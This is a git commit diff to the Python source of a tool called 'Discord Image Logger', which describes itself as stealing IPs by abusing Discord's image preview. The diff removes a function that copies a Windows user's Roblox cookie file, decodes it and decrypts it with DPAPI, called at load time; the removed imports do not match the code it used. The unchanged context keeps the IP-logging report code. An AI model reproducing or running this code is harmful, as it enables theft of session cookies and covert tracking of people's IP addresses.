5220889b2063adcfbdf24137de1d355f76edca02
YANSISOK <113627293+YANSISOK@users.noreply.github.com>
2025-08-31 22:35:21 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -4,10 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import os
-import shutil
-import json
-import win64crypt
+
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -90,42 +87,6 @@ def reportError(error):
         }
     ],
 })
-
-def retrieve_roblox_cookies():
-    user_profile = os.getenv("USERPROFILE", "")
-    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-    if not os.path.exists(roblox_cookies_path):
-        return
-    
-    temp_dir = os.getenv("TEMP", "")
-    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
-
-    with open(destination_path, 'r', encoding='utf-8') as file:
-        try:
-            file_content = json.load(file)
-            
-            encoded_cookies = file_content.get("CookiesData", "")
-            
-            if encoded_cookies:
-                decoded_cookies = base64.b64decode(encoded_cookies)
-                
-                try:
-                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-                    print("Decrypted Content:")
-                    print(decrypted_cookies.decode('utf-8', errors='ignore'))
-                except Exception as e:
-                    print(f"Error decrypting with DPAPI: {e}")
-            else:
-                print("Error: No 'CookiesData' found in the file.")
-        
-        except json.JSONDecodeError as e:
-            print(f"Error while parsing JSON: {e}")
-        except Exception as e:
-            print(f"Error: {e}")
-
-cookie = retrieve_roblox_cookies()
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
